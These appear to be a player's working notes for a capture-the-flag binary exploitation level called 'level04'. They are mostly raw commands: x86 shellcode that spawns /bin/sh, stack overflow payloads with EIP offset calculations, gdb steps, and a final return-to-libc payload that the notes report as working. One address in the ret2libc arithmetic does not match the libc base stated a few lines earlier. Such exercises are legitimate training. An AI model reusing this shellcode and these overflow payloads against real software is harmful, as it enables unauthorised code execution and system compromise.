
#try to give him some shellcode
python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" | ./level04

python -c "print 'A'*32 + '\x31\xc0\x31\xdb\xb0\x06\xcdi

#try to overflow
python -c "print 'A'*156" | ./level04

overflow at 156 car

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[shell code]+[AAAA...]+[address buffer]

python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' \
+ 'A'*80+ 'BCDE'"

#gdb to ptrace the child procress
set follow-fork-mode child

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE

=>we overflow eip at 160char

address buffer : 0x0xffffd640
=> \x40\xd6\xff\xff

shellcode 54 + 'A'*102+address 4 => 160
python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'A'*101+'\x40\xd6\xff\xff" > file

#in gdb we got no exec() for you
python -c "print '\x90'*101+'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+ '\x40\xd6\xff\xff'" > file
=> work on gdb but not in the real shell (why?)

#we try an other way to open shell
#link tuto https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
in gdb : info function
=> system address : 0xf7e6aed0

in gdb : info function
exit address : 0xf7e5eb70

info proc map
start libc : 0xf7e2c000
strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
15d7ec /bin/sh
=>we have an offset of 15d7ec after start libc
so address of /bin/sh is 0xf7fcc000 + 0x15d7ec = 0xf7f897ec

(python -c 'print "A"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level04

and it works